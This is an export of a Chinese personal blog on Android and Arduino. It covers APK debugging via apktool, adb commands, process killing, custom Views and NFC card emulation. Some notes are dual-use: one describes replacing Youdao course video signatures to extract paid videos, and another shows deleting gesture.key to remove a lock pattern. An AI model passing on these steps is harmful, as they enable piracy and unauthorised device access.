apktool低版本才有-d参数\n\t调试方法源程序修改一种比较旧的调试方法，使用apktool的-d选项\n\t①java -jar apktool.jar d -d目标.apk -o结果存放目录\n\t②修改Android.mainfest文件，在在application节点中添加android:debuggable=\"true\"\n\t③在入口点的类的onCreate方法中添加invoke-static{}, Landroid/os/Debug;->waitForDebugger()V\n\t④反编译修改过的 apk文件java -jar apktool.jar b -d代码目录-o目标apk名字\n\t⑤手动对apk文件进行签名java -jar signapk.jar testkey.x509.pem testkey.pk8未签名APK名签名apk名导入apk代码\n\t①Idea/AndroidStudio File -> open，选择编译后的文件目录，导入代码在相应的位置下好断点。\n\t②设置远程调试选项Run -> Debug Configurations -> Remote Java Application,Host填写为localhost,端口为Debug\n\t开放的端口8700打开目标apk文件\n\t①打开apk文件，直到看到wati for debugger的提示\n\t②打开 monitor，选中需要调试的程序，开启 8700端口Debug！！ -->\n\n## 一些学习网站\n\n[吾爱破解移动安全](https://www.52pojie.cn/forum-65-1.html)  \n[看雪论坛Android安全](https://bbs.pediy.com/forum-161.htm)  \n\n## 一些工具\n\n[android tools](https://down.52pojie.cn/Tools/Android_Tools/)  \n\n[Unicode工具](http://tool.chinaz.com/tools/unicode.aspx)  \n\n\n[mprop](https://github.com/wpvsyou/mprop)  \n[mprop 临时修改设备的系统调试状态值](https://pan.baidu.com/s/1ZfYCq-zHdAq-KUa1BkJ6bg)  \n[[原创]修改ro属性的小工具新版本-170119](https://bbs.pediy.com/thread-215311.htm)  \n[利用mprop工具修改当前手机应用都可以调试](https://www.jianshu.com/p/e540f34cec07)  \n[[原创]android ro.debuggable属性调试修改(mprop逆向)](https://bbs.pediy.com/thread-246081.htm)  \n[BDOpener——开启APK调试与备份选项的Xposed模块](https://security.tencent.com/index.php/opensource/detail/17)  \n\n\n[Android中带你开发一款自动爆破签名校验工具kstools](https://blog.csdn.net/jiangwei0910410003/article/details/70483088)  \n[带你开发一款给Apk中自动注入代码工具icodetools(开凿篇)](https://blog.csdn.net/jiangwei0910410003/article/details/53386071)  \n\n- AXMLEditor xml二进制 更改工具\n- Brida\n\tBrida是一款 Burp Suite 扩展，作为一座桥梁连接着Burp Suite以及Frida，以帮助用户修改应用程序与后端服务器之间的通信数据为己任。在分析移动端应用时遇到应用使用随机密钥式对称加密，如果不知道其使用的密钥就无法篡改其通信数据，通过Burp也就无法对所有的交换数据进行更改了，于是Brida就这样出现在我们视野中。\n\n\t参考：https://www.anquanke.com/post/id/86567\n\n\n## LINKS\n\n[你知道哪些Android逆向分析方法？](https://pockr.org/activity/detail?activity_no=act_0e6b60b83ec0357bce)  \n[一步一步带你反编译apk，并教你修改smali和重新打包](https://blog.csdn.net/sxk874890728/article/details/80486223)  \n[Android安全攻防战，反编译与混淆技术完全解析（上）](https://blog.csdn.net/guolin_blog/article/details/49738023)  \n[Android逆向之旅---解析编译之后的AndroidManifest文件格式](https://blog.csdn.net/jiangwei0910410003/article/details/50568487)  \n","tags":["android逆向"],"categories":["android逆向"]},{"title":"android启动一个app的命令","url":"/post/2019466879.html","content":"\n\n\t01/04 14:52:52: Launching app\n\t$ adb push /Users/shaomiao/Documents/product/adb_check_qr/app/build/outputs/apk/debug/app-debug.apk /data/local/tmp/com.demo.adbcheckqr\n\t$ adb shell pm install -t -r \"/data/local/tmp/com.demo.adbcheckqr\"\n\tSuccess\n\tAPK installed in 11 s 648 ms\n\t$ adb shell am start -n \"com.demo.adbcheckqr/com.demo.adbcheckqr.activity.TestActivity\" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER\n\tClient not ready yet..Waiting for process to come online\n\tWaiting for process to come online\n\tConnected to process 24996 on device huawei-col_al10-VBJ0218814008992\n\tCapturing and displaying logcat messages from application. This behavior can be disabled in the \"Logcat output\" section of the \"Debugger\" settings page.\n\tD/CrashReport: [Util] Try to lock file:local_crash_lock (pid=24996 | tid=25024)\n\tD/CrashReport: [Util] Successfully locked file: local_crash_lock (pid=24996 | tid=25024)\n\tD/CrashReport: Size of crash list loaded from DB: 0\n\tD/CrashReport: [Util] Try to unlock file: local_crash_lock (pid=24996 | tid=25024)\n\tD/CrashReport: [Util] Successfully unlocked file: local_crash_lock (pid=24996 | tid=25024)\n\tW/InputMethodManager: startInputReason = 8\n\tD/CrashReport: >>> com.demo.adbcheckqr.activity.TestActivity onPaused <<<\n\tV/ActivityThread: Finishing stop of ActivityRecord{43160d4 token=android.os.BinderProxy@6f9f93f {com.demo.adbcheckqr/com.demo.adbcheckqr.activity.TestActivity}}\n\tW/libEGL: EGLNativeWindowType 0x705d3b7010 disconnect failed\n\tV/ActivityThread: Handle window ActivityRecord{43160d4 token=android.os.BinderProxy@6f9f93f {com.demo.adbcheckqr/com.demo.adbcheckqr.activity.TestActivity}} visibility: false\n\n\n\tadb push /Users/shaomiao/Documents/product/adb_check_qr/app/build/outputs/apk/debug/app-debug.apk /data/local/tmp/com.demo.adbcheckqr\n\n\tadb shell pm install -t -r \"/data/local/tmp/com.demo.adbcheckqr\"\n\n\tadb shell am start -n \"com.demo.adbcheckqr/com.demo.adbcheckqr.activity.TestActivity\" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER\n\n\n\tadb push 上传\n\tadb shell pm install 安装\n\tadb shell am start 启动\n\n\n","tags":["android"],"categories":["android"]},{"title":"android gradle command not found在Mac中","url":"/post/919398938.html","content":"\n[[Mac] gradle command not found 解决方法](https://blog.csdn.net/blue_zy/article/details/79862373)  \n\n这个问题是在命令行中使用gradle命令不存在  \n只需要找到本地的gradle然后加到.zshrc文件中\n\n\n## OTHER\n\n实际操作中发现bin目录没有权限  \n\n\t然后改了一个文件夹权限 \n\tbin是 gradle的目录\n\t\n\tsudo chmod -R bin","tags":["android"],"categories":["android"]},{"title":"android yd","url":"/post/871619508.html","content":"\t\n\n\t /sdcard/Android/data/com.youdao.course/.Courses/\n\n\t 先提前把免费视频下载 \n\t 然后把文件名替换\n\n\n\t adb pull /sdcard/Android/data/com.youdao.course/.Courses/.c89b26d3a5dd2b9244a284a15169d2601545980518788.yd\n\n\t adb push xx.yd /sdcard/Android/data/com.youdao.course/.Courses/\n\n\tc89b26d3a5dd2b9244a284a15169d2601545980518788\n\t039d67a4c9aee89d7ac7c1410faa69781529575319769\n\n\n\t修改目的： \n\t把已经下载的付费视频，提取出来\n\t步骤：\n\t首先下载免费的视频，然后把付费下载过的视频 替换成免费的签名 就可以在播放器上继续观看付费视频，并且可以提取出来，在其他手机上观看\n\n\n\t格式大师\n\tES文件浏览器\n\t存储空间清理\n\n\n\t首先下载个视频\n\t格式大师 查看最新文件\n\tES文件浏览器 查看\n\n\tadb shell 操作\n\n\n\tadb shell显示隐藏文件\n\n\tls -a\n","tags":["android"],"categories":["android"]},{"title":"android杀死进程","url":"/post/2168217961.html","content":"\n测试手机：  \n华为荣耀6 型号 H60-L01  Android版本 4.4.2   \n\n\tandroid.os.Process.killProcess(pid); 结束pid的进程 并释放资源\n\n\tactivityManager.killBackgroundProcesses(pkgName); \n\n\tkill -9 pid\n\n\tsystem.exit(int) 关闭虚拟机 结束整个app 0表示正常结束 1表示异常结束\n\n\trestartPackage(getpackageName()); 2.2之前\n\t\tActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);\n\t\tmanager.restartPackage(getPackageName());\n\t\t<user-permission android:name=\"android.permission.RESTART_PACKAGES\"/>\n\n\tActivityManager killBackgroundProcess(packagename) 来结束app\n\n\n## 1\n\n\tps\n\n\tUSER 进程当前用户     PID Process ID 进程ID    PPID Process Parent ID 父进程ID   \n\tVSIZE Virtual Size 进程的虚拟内存大小      RSS Resident Set Size 实际驻留“在内存中”的内存大小\n\tWCHAN 休眠进程在内核中的地址     PC Program Counter     NAME 进程名\n\n\tps|grep <package-name>\n\n\tps|grep com.xx.xx\n\tu0_a150   10189 19086 913548 58872 ffffffff 00000000 S com.xx.xx:process1\n\tu0_a150   10258 19086 957020 75504 ffffffff 00000000 S com.xx.xx\n\tu0_a150   10350 19086 923572 70564 ffffffff 00000000 S com.xx.xx:pushservice\n\tu0_a150   10532 10350 1912   180   ffffffff 00000000 S /data/data/com.xx.xx/files/gdaemon_20161017\n\n\tsu\n\tkill -9 10189 10258 10350 10532\n\n\t以上杀死之后应用还会自启 真的是 直接 kill -9 19086 手机会重新启动\n\n## 2\n\n\tam force-stop <package-name>\n\n\tsu\n\tam force-stop com.xx.xx\n\n\tps|grep com.xx.xx \n\tu0_a150   28289 1     1912   180   ffffffff 40093b20 S /data/data/com.xx.xx/files/gdaemon_20161017\n\tu0_a150   30093 12460 913496 58692 ffffffff 40111954 S com.xx.xx:process1\n\tu0_a150   30140 12460 967536 74860 ffffffff 40111954 S com.xx.xx\n\tu0_a150   30175 12460 923952 68276 ffffffff 40111954 S com.xx.xx:pushservice\n\n\tam start -n <package-name/class-name>\n\n## Other\n\t\n\t试着查找了一下 父进程 发现了一个zygote\n\n\troot      12460 1     879800 71564 ffffffff 4007c8f0 S zygote\n\n## Besides\n\n[LBS&VirtualXposed&XposedInstaller&360极客版](https://pan.baidu.com/s/1vNqyTPEPyiWyZG306A76bw)  \n\n尝试装了LBE加速大师 杀死进程 不到1秒就会又存在  \n尝试装了Xposed 显示Xposed框架未安装 [抱歉，Xposed真的可以为所欲为——5.我自己刷的Xposed凭什么不给我用](https://blog.csdn.net/coder_pig/article/details/80586601)  [关于 Android 7.1 的 Xposed，你想知道的都在这](https://sspai.com/post/40121)  \n尝试装了VirtualXposed Failure INSTALL_FAILED_OLDER_SDK [VirtualXposed APK Download Page](https://www.tricksfolks.com/vx-apk-dl/)  \n尝试装绿色守护 [Greenify绿色守护酷安](https://www.coolapk.com/apk/com.oasisfeng.greenify) [googlepaly](http://www.zhihu.com/question/21007772) [Greenify](https://www.efanyh.com/archives/8250.html) Failure [INSTALL_FAILED_OLDER_SDK] 可能要试下老版本  \n(可以升级继续尝试下)尝试装360极客版  清理之后 目标应用还会重启 然后开机不会自启 打开目标应用 然后清理 目标应用还会自启  \n尝试装了LBE安全大师 不好使  \n[冰箱](https://www.coolapk.com/apk/com.catchingnow.icebox) Failure [INSTALL_FAILED_OLDER_SDK]  \n[小黑屋](https://www.coolapk.com/apk/web1n.stopapp)  Failure [INSTALL_FAILED_OLDER_SDK]  \n黑域 还没下载尝试[黑域](http://zuimeia.com/app/5206/?platform=2)  \n[android_background_ignore](https://github.com/Jiangyiqun/android_background_ignore)  只支持android7.0 8.0  \n\n---\n\nmy Android tools [如何正确使用 My Android Tools 调教各大流氓软件？](https://www.zhihu.com/question/26934572) [如何遏制安卓系统中BAT系软件的后台自动唤醒？](https://www.zhihu.com/question/30971054)  \n3c toolbox pro  \nApp Ops [给有一定动手能力又不怕麻烦的人~~ADB限制后台命令RUN_IN_B..](http://bbs.gfan.com/android-9160337-1-1.html) [IT之家学院：如何免ROOT阻止Android应用唤醒](https://www.ithome.com/html/android/323417.htm)  \nShuzuku Manager  \n\n---\n[[大型原创教程]如何完美解决Android系统后台、关联唤醒、自启动、全家桶问题](http://bbs.nga.cn/read.php?tid=8928147&rand=530)  \n\n\n\n## Finally\n\n最后结论是这个软件太流氓了 process1和pushservice是关键 估计要杀死应用要 先杀死这个  \n阻止zygote [Android系统启动2---Zygote启动及其作用](https://www.cnblogs.com/herenzhiming/articles/4998045.html)  \n\n你好到手机管家—权限管理—自动自启管理,第一个你进去设置一下，这个就是关联启动的  \n华为荣耀6禁止应用自启动/唤醒  \n开发者选项不允许后台进程  \n取消app系统权限  \n\n\n## LINKS\n\n[通过adb操作安卓亮屏解锁打开app](https://blog.csdn.net/feigoliu/article/details/50505377)  \n\n[Xposed 入坑篇](https://www.jianshu.com/p/0c75c3169abb)  \n[[实用教程] 【省电教程】无需Root，Nexus 6P限制APP唤醒的方法](http://bbs.gfan.com/android-8418350-1-1.html)    \n[【导航贴】绿色守护教程/资源/问答 v1.0](https://tieba.baidu.com/p/5108711355?red_tag=2001865390)  \n[有没有有效的办法切断安卓app的相互唤醒路径？](https://www.zhihu.com/question/31560390)  \n[Android中如何杀死后台应用而不自启动](https://blog.csdn.net/duan140524/article/details/51766695)  \n[Android系统启动2---Zygote启动及其作用](https://www.cnblogs.com/herenzhiming/articles/4998045.html)  ","tags":["android"],"categories":["android"]},{"title":"android多线程笔记","url":"/post/186583718.html","content":"\n《Android进阶之光》第四章多线程编程 学习笔记\n\n## 为什么使用多线程\n\n- 使用多线程可以减少程序响应时间。\n- 与进程相比 线程创建和切换开销更小，同时多线程在数据共享方面效率非常高。\n- 多CPU或者多核计算机本身就具备执行多线程的能力。如果使用单个线程，将无法重复利用\n\n---\n\n\tJAVA Future  \n\tnotifyall()  \n\tThread.yield()\n\tThread join();\n\n---\n## ERROR\n\n\tTimerTask is scheduled already\n\n[TimerTask is scheduled already 解决方法](https://blog.csdn.net/lishouyi710/article/details/53671014)  \n\n\n## LINKS\n\n[Android线程池得要这么用](https://www.jianshu.com/p/6c1b18723197)  \n[Android 线程池原理及使用](https://www.jianshu.com/p/7b2da1d94b42)  \n[（转载）Android开发——Android中常见的4种线程池（保证你能看懂并理解）](https://www.cnblogs.com/1925yiyi/p/9040605.html)  \n[Android--多线程之Handler](https://www.cnblogs.com/shirley-1019/p/3557800.html)  \n[JAVA Future类详解](https://blog.csdn.net/u014209205/article/details/80598209)  \n[Java多线程学习之wait、notify/notifyAll 详解](http://www.cnblogs.com/moongeek/p/7631447.html)  \n[Thread中yield方法](https://www.cnblogs.com/java-spring/p/8309931.html)  \n[【Bugly干货】Android性能优化典范之多线程篇](http://www.cnblogs.com/bugly/p/5519510.html)  \n[Android耗时任务处理方案--AsyncTask](https://blog.csdn.net/madahe/article/details/53043463)  \n[Android 多线程----AsyncTask异步任务详解](https://www.cnblogs.com/smyhvae/p/3866570.html)  \n[详解AsyncTask的cancel的有效用法，强制停止AsyncTask异步任务](https://www.aliyun.com/jiaocheng/39574.html)  \n[Android定时执行和停止某任务](https://www.cnblogs.com/lanceblog/p/6600846.html)  \n[关于同步、异步与阻塞、非阻塞的理解](https://www.cnblogs.com/Anker/p/5965654.html)  \n[Java中终止正在运行线程](https://www.cnblogs.com/bosongokay/p/6832409.html?utm_source=itdadao&utm_medium=referral)  \n[Java 浅析 Thread.join()](http://www.cnblogs.com/huangzejun/p/7908898.html)  \n\n[Android 定时器Timer的使用](https://www.jianshu.com/p/dd5de8dbbe81)  \n[Android中定时器Timer和TimerTask的启动，停止，暂停，继续等操作实例](https://blog.csdn.net/dj0379/article/details/50877746)  \n\n","tags":["android"],"categories":["android"]},{"title":"arduino小车笔记","url":"/post/4126435275.html","content":"\n\t模块 L298n arduino \n\t拼装焊接\n\t代码 \n\n\t马达焊接导线\n\n\tuno 5v L298n 5v\n\tuno gnd l298n gnd\n\n\t电池 红线 连开关  l298n 12v+\n\n\t电池 黑线 l298n gnd\n\n\t马达线 l2980 out1 out2 out3 out4 \n\n\tl298n 4个引脚 1234 连 uno 1267\n\n## 代码\n\n\tvoid setup()\n\t{\n\t  pinMode( 1 , OUTPUT);\n\t  pinMode( 2 , OUTPUT);\n\t  pinMode( 6 , OUTPUT);\n\t  pinMode( 7 , OUTPUT);\n\t}\n\n\tvoid loop()\n\t{\n\t  digitalWrite( 1 , HIGH );\n\t  digitalWrite( 2 , LOW );\n\t  digitalWrite( 6 , HIGH );\n\t  digitalWrite( 7 , LOW );\n\t}\n\n## 前言\n\n[Arduino Uno简介](https://baijiahao.baidu.com/s?id=1587399157305419173&wfr=spider&for=pc)  \n\n## IMG\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/26/01.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/26/02.png)\n\n## L298N\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/26/03.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/26/04.png)\n\n## ESP8266\n\n## ESP8266WIFI\n\n## 蓝牙模块(HC-05)\n\n[arduino蓝牙模块控制教程](https://jingyan.baidu.com/article/d45ad148b252a969552b80db.html)  \n\n## LINKS\n\n[使用Arduino与L298N(红板) 驱动直流电机](https://blog.csdn.net/ling3ye/article/details/51351115)  \n[XTWduino UNO R3 开发板 改进版 行家版本 Arduino](http://b2b.liebiao.com/dianziyuanqijian/305205570.html)  \n[[官方公告] blinker快速接入指南](https://www.arduino.cn/thread-76018-1-1.html)  \n[Arduino UNO中文数据手册](https://www.arduino.cn/thread-81889-1-1.html)  \n[arduino社区](https://www.arduino.cn/)  \n[【开源硬件】智能小车学习教程](https://www.bilibili.com/video/av13906282?p=13)  \n[Arduino智能小车——测试篇](https://blog.csdn.net/qq_16775293/article/list/3)  \n[Arduino小车诞生记](https://www.guokr.com/article/252083/)  \n\n[Arduino+ESP8266WIFI（1）——模块测试](https://blog.csdn.net/wuyanmin1995/article/details/74352155)  ","tags":["arduino"],"categories":["arduino"]},{"title":"android nfc模拟卡","url":"/post/2987589929.html","content":"\n[搞定加密卡！小米门禁卡模拟那些事](http://bbs.xiaomi.cn/t-30553502-1-o1)  \n\n## 手机信息\n```\n手机：小米5s\n版本：MIUI10 8.11.1 开发版\n```\n## 0x00 解锁&&刷机\n\n**解锁**  \n\n首先登录小米官网获取解锁工具  \n[解锁工具下载](https://unlock.update.miui.com)  \n[小米手机解锁 Bootloader 教程以及常见问题](http://www.miui.com/thread-3367802-1-1.html)  \n<!-- \n官网给的解决方案：  \n```\n请按照以下流程进行操作：\n1.进入“设置 -> 开发者选项 -> 设备解锁状态”中绑定账号和设备；\n2.手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；\n3.通过USB连接手机，点击 “解锁”按钮；\n``` -->\n \n\n解锁的时候要检查解锁账号，要3天验证在这个手机登录  \n\n1.小米手机设置  \n设置-小米账号-登录小米账号  \n关机  \n进入Bootloader模式(同时按住开机键和音量下键)  \n会出现一个安卓小机器人下面FASTBOOT文字  \nusb连接电脑  \n\n2.电脑端  \n打开下载的手机解锁工具  \n点击解锁  \n然后弹出确认解锁  \n等待解锁  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/01.png)\n\n<!-- ```\n\n设置 -> 更多设置 -> 开发者选项 -> 设备解锁状态 -> 绑定账号和设备  \n关机 -> 同时按住开机键和音量下键 -> 打开下载的工具 -> 手机连接 -> 解锁  \n``` -->\n\n<!-- ```\n开发者选项:\n我的设备 - 全部参数 - MIUI版本 多次按 进入开发者模式  \n``` -->\n\n**刷机**  \n\n[通用线刷教程](http://www.miui.com/shuaji-393.html)  \n\n参考了上面的文章  \n\n步骤：\n下载通用解锁工具  \n下载线刷包下载开发版的(开发版自带root)   \n手机关机状态下，同时按住 音量下+电源键 进入Fastboot模式将手机USB连接电脑。  \nusb连接电脑  \n解压线刷包  \n打开通用解锁工具  \n选择解压目录  \n点击加载设备  \n刷机  \n等待成功  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/02.png)\n\n## 0x01 nfc软件\n在酷安找到了一些app  \n[nfc list](https://www.coolapk.com/search?q=nfc)  \n然后测试了一下NFC卡模拟  \n\n然后给NFC卡模拟 root权限 和 nfc权限  \n\n安全中心-应用管理-权限-ROOT权限管理 给 NFC卡模拟  \n\n**然后测试软件**  \n卡读取成功了  \n然后测试门禁不好使  \n\n-----后文再续\n\n[【教程】让你的手机模拟门禁卡 拿着手机进小区 加密也模拟](http://www.miui.com/thread-5869303-1-1.html)  \n[成功复制加密门禁卡！！！](http://tieba.baidu.com/p/5759500931)  \n[【原创】浅谈NFC手机模拟门禁卡、饭卡（非ROOT）-精华帖](https://club.huawei.com/thread-12231900-1-1.html)  \n[NFC卡模拟](https://www.coolapk.com/apk/com.yuanwofei.cardemulator)  \n[如何利用Nexus 5伪造一张门禁卡](https://www.freebuf.com/geek/80368.html)  \n[搞定加密卡！小米门禁卡模拟那些事](http://www.jinciwei.cn/f268134.html)  \n[Root神器--超级授权SuperSU_v2.82-SR5专业破解最新版！](https://club.huawei.com/thread-14272732-1-1.html)  \n[【HRT_梦里无念】荣耀6X TWRP3.1 EMUI5.0专用 支持Data解密](https://club.huawei.com/forum.php?mod=viewthread&tid=12832132)  \n[小米线刷](http://www.miui.com/shuaji-393.html)  \n[小米手机MIUI9开发版开启ROOT权限方法](https://jingyan.baidu.com/article/a3a3f8112501e38da3eb8a65.html)  \n[小米开发版获取完整root教程](http://www.miui.com/thread-8282972-1-1.html)  \n[【解锁教程&ROOT教程】支持全系华为](https://blog.csdn.net/xCnhYKoHj3eK/article/details/79016306)  \n[怎么强制解华为锁bl锁](https://jingyan.baidu.com/article/363872ec7246e36e4ba16f24.html)  \n[求这个型号的华为手机强制解除BL锁有效方法](https://www.52pojie.cn/thread-780859-1-1.html)  \n[Browse files by Device](http://downloadandroidrom.com/)  \n[Driver Binaries for Nexus and Pixel Devices](https://developers.google.com/android/drivers)  \n[xda-developers](https://www.xda-developers.com/)  ","tags":["android"],"categories":["android"]},{"title":"android自定义View处理padding和wrap_content和自定义属性","url":"/post/1728291640.html","content":"\n## android View 处理padding\n\n\t@Override\n\t\tprotected void onDraw(Canvas canvas) {\n\t\t\tsuper.onDraw(canvas);\n\t\t\tint paddingLeft=getPaddingLeft();\n\t\t\tint paddingRight=getPaddingRight();\n\t\t\tint paddingTop=getPaddingTop();\n\t\t\tint paddingBottom=getPaddingBottom();\n\t\t\tint width = getWidth()-paddingLeft-paddingRight;\n\t\t\tint height = getHeight()-paddingTop-paddingBottom;\n\t\t\tcanvas.drawRect(0+paddingLeft,0+paddingTop,width+paddingRight,height+paddingBottom,mPaint);\n\t\t}\n\n## 对wrap_content属性进行处理\n\n在onMeasure方法中指定一个默认的宽和高，在设置wrap_content属性时设置此默认的宽和高就可以了：  \nsetMeasuredDimension() 方法px  \n\t\n\t@Override\n\tprotected void onMeasure(int widthMeasureSpec,int heightMeasureSpec) {\n\t\tsuper.onMeasure(widthMeasureSpec,heightMeasureSpec);\n\t\tint widthSpecMode = MeasureSpec.getMode(widthMeasureSpec);\n\t\tint heightSpecMode = MeasureSpec.getMode(heightMeasureSpec);\n\t\tint widthSpecSize = MeasureSpec.getSize(widthMeasureSpec);\n\t\tint heightSpecSize = MeasureSpec.getSize(heightMeasureSpec);\n\t\tif(widthSpecMode==MeasureSpec.AT_MOST&&heightSpecMode==MeasureSpec.AT_MOST){\n\t\t\tsetMeasuredDimension(600,600);\n\t\t}else if(widthSpecMode==MeasureSpec.AT_MOST){\n\t\t\tsetMeasuredDimension(600,heightSpecSize);\n\t\t}else if(heightSpecMode==MeasureSpec.AT_MOST){\n\t\t\tsetMeasuredDimension(widthSpecSize,600);\n\t\t}\n\t}\n\n## 自定义属性\n\t\n在values目录下创建attrs.xml  \n\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<resources>\n\t\t<declare-styleable name=\"RectView\">\n\t\t\t<attr name=\"rect_color\" format=\"color\"/>\n\t\t</declare-styleable>\n\t</resources>\n\t\n解析自定义属性的值  \n\n\tpublic RectView(Context context, AttributeSet attrs) {\n\t\tsuper(context, attrs);\n\t\tTypedArray mTypedArray=context.obtainStyledAttributes(attrs,R.styleable.RecyView);\n\t\t// 提取RectView属性集合的rect_color属性。如果没设置，默认值为Color.RED\n\t\tmColor=mTypedArray.getColor(R.styleable.RectView_rect_color,Color.RED);\n\t\t// 获取资源后要及时回收\n\t\tmTypedArray.recycle();\n\t\tinitDraw();\n\t}\n\n\t<com.xx.RectView\n\t\txmlns:app=\"http://schemas.android.com/apk/res-auto\"\n\t\tandroid:id=\"@+id/rv_rect\"\n\t\tandroid:layout_width=\"wrap_content\"\n\t\tandroid:layout_height=\"200dp\"\n\t\tandroid:layout_below=\"@id/iv_text\"\n\t\tandroid:layout_marginTop=\"50dp\"\n\t\tandroid:layout_centerHorizontal=\"true\"\n\t\tandroid:padding=\"10dp\"\n\t\tapp:rect_color=\"@android:color/holo_blue_light\"/>\n\n完整代码：  \n\n\tpublic class RectView extends View {\n\t\tprivate Paint mPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n\t\tprivate int mColor=Color.RED;\n\t\tpublic RectView(Context context) {\n\t\t\tsuper(context);\n\t\t\tinitDraw();\n\t\t}\n\n\t\tpublic RectView(Context context,AttributeSet attrs) {\n\t\t\tsuper(context, attrs);\n\t\t\tTypedArray mTypedArray=context.obtainStyledAttributes(attrs,R.styleable.RectView);\n\t\t\t//提取RectView属性集合的rect_color属性。如果没设置，默认值为Color.RED\n\t\t\tmColor=mTypedArray.getColor(R.styleable.RectView_rect_color,Color.RED);\n\t\t\t//获取资源后要及时回收\n\t\t\tmTypedArray.recycle();\n\t\t\tinitDraw();\n\t\t}\n\n\t\tpublic RectView(Context context, AttributeSet attrs, int defStyleAttr) {\n\t\t\tsuper(context, attrs, defStyleAttr);\n\t\t\tinitDraw();\n\t\t}\n\n\t\tprivate void initDraw() {\n\t\t\tmPaint.setColor(mColor);\n\t\t\tmPaint.setStrokeWidth((float)1.5);\n\t\t}\n\n\t\t@Override\n\t\tprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\tsuper.onMeasure(widthMeasureSpec,heightMeasureSpec);\n\t\t\tint widthSpecMode = MeasureSpec.getMode(widthMeasureSpec);\n\t\t\tint heightSpecMode = MeasureSpec.getMode(heightMeasureSpec);\n\t\t\tint widthSpecSize=MeasureSpec.getSize(widthMeasureSpec);\n\t\t\tint heightSpecSize=MeasureSpec.getSize(heightMeasureSpec);\n\t\t\tif(widthSpecMode==MeasureSpec.AT_MOST&&heightSpecMode==MeasureSpec.AT_MOST){\n\t\t\t\tsetMeasuredDimension(400,400);\n\t\t\t}else if(widthSpecMode==MeasureSpec.AT_MOST){\n\t\t\t\tsetMeasuredDimension(400,heightSpecSize);\n\t\t\t}else if(heightSpecMode==MeasureSpec.AT_MOST){\n\t\t\t\tsetMeasuredDimension(widthSpecSize,400);\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\tprotected void onDraw(Canvas canvas) {\n\t\t\tsuper.onDraw(canvas);\n\t\t\tint paddingLeft = getPaddingLeft();\n\t\t\tint paddingRight = getPaddingRight();\n\t\t\tint paddingTop = getPaddingTop();\n\t\t\tint paddingBottom = getPaddingBottom();\n\t\t\tint width = getWidth()-paddingLeft-paddingRight;\n\t\t\tint height = getHeight()-paddingTop-paddingBottom;\n\t\t\tcanvas.drawRect(0+paddingLeft,0+paddingTop,width+paddingRight,height+paddingBottom,mPaint);\n\t\t}\n\t}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["android"],"categories":["android"]},{"title":"android音视频开发学习链接","url":"/post/4017499480.html","content":"\n    1. 《雷霄骅的专栏》：http://blog.csdn.net/leixiaohua1020\n\n    2. 《Android音频开发》：http://ticktick.blog.51cto.com/823160/d-15\n\n    3. 《FFMPEG Tips》：http://ticktick.blog.51cto.com/823160/d-17\n\n    4. 《Learn OpenGL 中文》：https://learnopengl-cn.readthedocs.io/zh/latest/\n\n    5. 《Android Graphic 架构》：https://source.android.com/devices/graphics/\n\n## LINKS\n\n[Android 音视频开发入门指南](http://blog.51cto.com/ticktick/1956269)  \n[Android音视频开发进阶](https://blog.csdn.net/eydwyz/article/details/79112260)  \n\n\n\n","tags":["android"],"categories":["android"]},{"title":"android adb shell 常用命令","url":"/post/2043065794.html","content":"\n\tmonitor\n\n## 一些路径\n\n\t密码锁\n\t\t/data/system\n\t\t\tpassword.key\n\t\t\tgesture.key\n\n\t\tcd /data/system\n\t\trm gesture.key\n\n\t二进制文件\n\t\t/system/bin\n\t\t/system/xbin\n\n\t应用数据\n\t\t/data/data\n\t\t/data/data/xx.xx\n\t\t>ls\n\t\tcache\n\t\tdatabases\n\t\tfiles\n\t\tlib\n\n\t原始安装文件\n\t\t/data/app\n\n\tplay商店购买app\n\t\t/data/app-private\n\n\t系统app存放目录\n\t\t/system/app/xx.apk\n\n\t应用app存放目录\n\t\t/data/app/xx.apk\n\n\tinstall存放app的临时目录\n\t\t/data/local/tmp/xx.apk\n\n\t缓存目录\n\tadb pull /sdcard/tencent/MobileQQ/diskcache/ \n\n\n---\n\n## tools 环境变量\n\nmac:\n\t/Users/xx/Library/Android/sdk/tools/bin\n\tarchquery         jobb              monkeyrunner      sdkmanager\n\tavdmanager        lint              screenshot2       uiautomatorviewer\n\n\t/Users/xx/Library/Android/sdk/tools\n\tNOTICE.txt        emulator-check    monitor           support\n\tandroid           lib               package.xml\n\tbin               miao.xml          proguard\n\temulator          mksdcard          source.properties\n\n\t/Applications/AndroidStudio.app/Contents/gradle/gradle-4.10.1/bin\n\tgradle     gradle.bat\n---\n\n\t <!-- ps|grep com.songheng.eastnews  \n\tcom.songheng.eastnews/com.oa.eastfirst.activity.WelcomeActivity -->\n\n\thttp://adbshell.com/\n\n\t<!-- /Users/shaomiao/Library/Android/sdk/tools/monitor   -->\n\n[Android ADB命令?这一次我再也不死记了!【简单说】](https://www.jianshu.com/p/56fd03f1aaae)  \n\n## 分辨率\n\n\tadb shell wm size\n\t> Physical size: 1080x1920\n\n## abi\n\n\tadb shell getprop ro.product.cpu.abi\n\t> arm64-v8a\n\n## adb forword\n\n\tadb forward tcp:11111 tcp:22222\n\t感觉这个命令挺酷的\n\n[adb forward的细节（1）：原理概述](https://blog.csdn.net/u013553529/article/details/80036227)  \n[adb forward的细节（4）：使用adb forward打造一个PC端与手机端交互的工具](https://blog.csdn.net/u013553529/article/details/80296870)  \n[ANDROID: 超级好用的ADB FORWARD命令](https://blog.csdn.net/omnispace/article/details/80018705)  \n[Android - adb forward实现PC和App的Socket通讯](https://blog.csdn.net/merrylilili/article/details/74641369)  \n\n## am\n\t\n\tam start -a android.intent.action.CALL -d tel:10086  拨打电话\n\t-a表示动作 -d 